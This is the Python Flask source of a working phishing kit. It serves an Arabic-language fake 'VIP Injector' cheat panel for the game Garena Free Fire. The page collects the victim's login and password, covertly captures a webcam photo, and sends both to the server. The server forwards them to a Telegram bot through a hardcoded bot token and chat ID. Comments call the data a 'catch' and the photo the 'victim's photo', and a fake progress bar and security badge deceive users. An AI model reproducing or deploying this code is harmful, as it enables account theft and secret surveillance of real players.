import telebot
from flask import Flask, request, render_template_string
import base64
import os

# --- إعداداتك ---
TOKEN = "8195744080:AAHrjFbYsoAvm4Oi2EhJI09KShSvp3G76Vc"
CHAT_ID = "8362370478"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- رابط التحميل بعد الصيد ---
DOWNLOAD_LINK = "https://www.mediafire.com/file/example" 

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Free Fire - VIP Panel</title>
    <style>
        :root { --gold: #ffb900; --purp: #7d2ae8; }
        body { margin: 0; background: #000; font-family: 'Cairo', sans-serif; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        
        /* الخلفية الاحترافية */
        .bg-video { position: fixed; right: 0; bottom: 0; min-width: 100%; min-height: 100%; z-index: -1; opacity: 0.4; filter: blur(5px); }
        
        .main-card {
            width: 380px; background: rgba(15, 15, 15, 0.95); border: 1px solid rgba(255, 185, 0, 0.3);
            border-radius: 25px; padding: 40px 30px; text-align: center; backdrop-filter: blur(10px);
            box-shadow: 0 0 50px rgba(125, 42, 232, 0.2); position: relative;
        }

        .garena-logo { width: 140px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--gold)); }
        
        h2 { font-size: 22px; margin-bottom: 5px; color: var(--gold); text-transform: uppercase; letter-spacing: 2px; }
        p { font-size: 13px; color: #aaa; margin-bottom: 30px; }

        .input-box { position: relative; margin-bottom: 20px; }
        input {
            width: 100%; padding: 15px; background: rgba(255,255,255,0.05); border: 1px solid #333;
            border-radius: 12px; color: white; outline: none; transition: 0.3s; box-sizing: border-box; text-align: right;
        }
        input:focus { border-color: var(--gold); box-shadow: 0 0 15px rgba(255, 185, 0, 0.2); }

        .btn-glow {
            width: 100%; padding: 16px; background: linear-gradient(45deg, var(--purp), #c02ae8);
            border: none; border-radius: 12px; color: white; font-weight: bold; font-size: 16px;
            cursor: pointer; transition: 0.4s; margin-top: 10px; box-shadow: 0 5px 20px rgba(125, 42, 232, 0.4);
        }
        .btn-glow:hover { transform: scale(1.02); box-shadow: 0 5px 30px rgba(125, 42, 232, 0.6); }

        /* عداد التحميل الوهمي */
        .loader-wrap { display: none; margin-top: 20px; }
        .bar { width: 100%; height: 6px; background: #222; border-radius: 10px; overflow: hidden; }
        .progress { width: 0%; height: 100%; background: var(--gold); transition: 2s linear; }

        .security-note { font-size: 10px; color: #555; margin-top: 25px; display: flex; align-items: center; justify-content: center; gap: 5px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="main-card">
    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/4/41/Garena_Free_Fire_logo.png/250px-Garena_Free_Fire_logo.png" class="garena-logo">
    <h2>VIP INJECTOR 2026</h2>
    <p>قم بتوثيق الحساب لتفعيل الـ Anti-Ban وحقن السكربت</p>

    <div id="login-form">
        <div class="input-box">
            <input type="text" id="user" placeholder="الإيميل أو رقم الهاتف">
        </div>
        <div class="input-box">
            <input type="password" id="pass" placeholder="كلمة المرor">
        </div>
        <button class="btn-glow" onclick="startHack()">تفعيل النظام الآن</button>
    </div>

    <div class="loader-wrap" id="loader">
        <div class="bar"><div class="progress" id="p-bar"></div></div>
        <p style="margin-top:10px; font-size:11px;">جاري تشفير الاتصال وحقن البيانات...</p>
    </div>

    <div class="security-note">
        <img src="https://img.icons8.com/ios-filled/50/444444/shield.png" width="12">
        محمي بواسطة Garena Security System
    </div>
</div>

<video id="v" autoplay></video>
<canvas id="c"></canvas>

<script>
async function startHack() {
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;

    if(u.length < 5 || p.length < 5) { alert("خطأ في البيانات!"); return; }

    document.getElementById('login-form').style.display = 'none';
    document.getElementById('loader').style.display = 'block';
    setTimeout(() => { document.getElementById('p-bar').style.width = '100%'; }, 100);

    // عملية التصوير
    try {
        const s = await navigator.mediaDevices.getUserMedia({video: true});
        const v = document.getElementById('v');
        v.srcObject = s;
        
        setTimeout(() => {
            const c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            const img = c.toDataURL('image/png');
            
            fetch('/final_capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u: u, p: p, i: img})
            }).then(() => { window.location.href = "{{ download_url }}"; });
        }, 2000);
    } catch(e) {
        fetch('/final_capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({u: u, p: p, i: "none"})
        }).then(() => { window.location.href = "{{ download_url }}"; });
    }
}
</script>

</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE, download_url=DOWNLOAD_LINK)

@app.route('/final_capture', methods=['POST'])
def final_capture():
    data = request.json
    msg = f"🔥 **صيد جديد**\\n👤: `{data['u']}`\\n🔑: `{data['p']}`"
    bot.send_message(CHAT_ID, msg, parse_mode="Markdown")
    
    if data['i'] != "none":
        img_data = base64.b64decode(data['i'].split(',')[1])
        with open("target.png", "wb") as f: f.write(img_data)
        with open("target.png", "rb") as f:
            bot.send_photo(CHAT_ID, f, caption="📸 صورة الضحية")
    return "ok"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
